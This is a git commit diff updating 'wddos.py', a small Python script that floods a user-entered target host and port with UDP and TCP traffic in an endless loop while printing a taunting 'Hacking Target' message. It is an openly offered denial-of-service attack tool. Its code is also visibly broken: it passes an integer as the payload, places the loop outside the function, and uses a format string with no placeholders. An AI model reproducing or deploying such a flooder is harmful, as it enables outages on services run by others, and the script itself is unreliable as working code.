88f6a57ada30c0d48e0b50fdedc8b5003740c6ab
MrSanZz <95021841+MrSanZz@users.noreply.github.com>
2023-10-09 20:34:26 +0700

    Update wddos.py

--- wddos.py
+++ wddos.py
@@ -7,14 +7,14 @@ port = input("Port : ")
 
 def flood(trgt, port):
     udp1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    udp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM
-    udp = udp1 + udp2
+    udp2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     bytes = 6000000
     send = 500
 
 while 2:
     pass
-    udp.sendto(bytes, (trgt, port))
+    udp1.sendto(bytes, (trgt, port))
+    udp2.sendto(bytes, (trgt, port))
     send = send + 2
     print "Hacking Target With So Much Love :D"%(send, trgt, port)
 
